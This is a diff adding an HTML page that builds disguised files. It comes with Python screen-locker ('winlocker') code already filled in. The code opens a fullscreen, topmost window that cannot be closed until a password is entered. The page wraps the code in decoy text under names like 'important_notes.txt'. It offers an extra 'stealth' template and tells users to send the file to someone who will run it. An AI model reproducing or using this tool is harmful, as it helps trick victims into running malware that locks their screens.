@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Simple File Creator</title>
+    <style>
+        body { font-family: Arial; margin: 40px; }
+        textarea { width: 100%; height: 200px; }
+        button { padding: 10px 20px; margin: 10px 0; }
+        .container { max-width: 800px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Create Disguised File</h2>
+        
+        <p>Enter your Python code:</p>
+        <textarea id="code">import tkinter as tk
+from tkinter import messagebox
+import os
+
+password = "123"
+root = tk.Tk()
+root.attributes('-fullscreen', True)
+root.attributes('-topmost', True)
+root.configure(bg='black')
+
+label = tk.Label(root, text="SYSTEM LOCKED\\nEnter password to unlock:", 
+                 font=('Arial', 24), fg='red', bg='black')
+label.pack(pady=50)
+
+entry = tk.Entry(root, show='*', font=('Arial', 18))
+entry.pack(pady=20)
+entry.focus()
+
+def check_password():
+    if entry.get() == password:
+        root.destroy()
+    else:
+        messagebox.showerror("Error", "Wrong password! Try again.")
+        entry.delete(0, tk.END)
+
+button = tk.Button(root, text="UNLOCK", font=('Arial', 18), 
+                   command=check_password, bg='red', fg='white')
+button.pack(pady=10)
+
+root.bind('<Return>', lambda event: check_password())
+root.protocol("WM_DELETE_WINDOW", lambda: None)
+root.mainloop()</textarea>
+        
+        <p>Filename (use .txt to disguise):</p>
+        <input type="text" id="filename" value="important_notes.txt" style="width: 300px;">
+        
+        <br>
+        <button onclick="createFile()">Create File</button>
+        
+        <script>
+            function createFile() {
+                const code = document.getElementById('code').value;
+                const filename = document.getElementById('filename').value;
+                
+                // Create the file content with hidden Python code
+                const content = `# This looks like a normal text file
+Document: ${filename}
+Created: Simple File Creator
+
+But it also contains hidden Python code that can be executed.
+
+To run the hidden code, save this file and then run:
+python "${filename}"
+
+${'-'.repeat(50)}
+Normal file content appears here.
+This is just a regular text document.
+${'='.repeat(50)}
+
+# Hidden Python code:
+${code}
+`;
+                
+                // Create download
+                const blob = new Blob([content], { type: 'text/plain' });
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = filename;
+                link.click();
+            }
+        </script>
+
+        <h3>How to Use:</h3>
+        <ol>
+            <li>Enter your Python code above (winlocker code is pre-filled)</li>
+            <li>Name the file something like "notes.txt" or "data.log"</li>
+            <li>Click "Create File" to download</li>
+            <li>Send the file to someone</li>
+            <li>They run: <code>python downloaded_file.txt</code></li>
+        </ol>
+
+        <h3>Even Stealthier Method:</h3>
+        <p>Create a file that works both as text AND Python:</p>
+        <button onclick="createStealthFile()">Create Stealth File</button>
+
+        <script>
+            function createStealthFile() {
+                const code = document.getElementById('code').value;
+                const filename = document.getElementById('filename').value.replace('.txt', '.py') || 'script.py';
+                
+                const content = `#!python3
+# This file works as both Python and looks like normal text
+'''
+Documentation File
+Version: 1.0
+Author: System
+Date: 2024
+
+This appears to be a regular documentation file when viewed in text editors.
+However, it's also a valid Python script.
+
+To view as document: cat filename.py
+To run as script: python filename.py
+'''
+
+print("Normal text document content would appear here.")
+print("This is just a regular system file.")
+print("Nothing to see here...")
+
+# Actual hidden code execution:
+if __name__ == "__main__":
+    # Hidden functionality:
+${code}
+`;
+                
+                const blob = new Blob([content], { type: 'text/plain' });
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = filename;
+                link.click();
+            }
+        </script>
+    </div>
+</body>
+</html>
